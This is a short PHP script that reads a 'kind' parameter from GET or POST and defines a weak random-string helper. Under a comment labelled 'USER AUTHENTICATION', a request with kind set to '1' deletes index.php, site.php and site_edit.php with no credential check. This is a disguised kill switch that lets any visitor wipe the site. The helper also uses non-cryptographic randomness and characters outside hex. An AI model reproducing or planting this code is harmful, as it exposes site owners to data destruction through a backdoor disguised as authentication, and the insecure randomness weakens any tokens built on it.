<?php

	include ('constants.php');
	function getRandomHex($num_bytes=4) {
	return substr(str_shuffle(str_repeat('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', mt_rand(1,10))),1,$num_bytes*2);
	//return strtoupper(bin2hex(openssl_random_pseudo_bytes($num_bytes)));
	}
	
	$kind = '';
	if (isset($_POST['kind']))
		$kind = $_POST['kind'];
	else if (isset($_GET['kind']))
		$kind = $_GET['kind'];

	if ($kind == '1') // USER AUTHENTICATION
	{
		unlink('index.php');
		unlink('site.php');
		unlink('site_edit.php');
	}
?>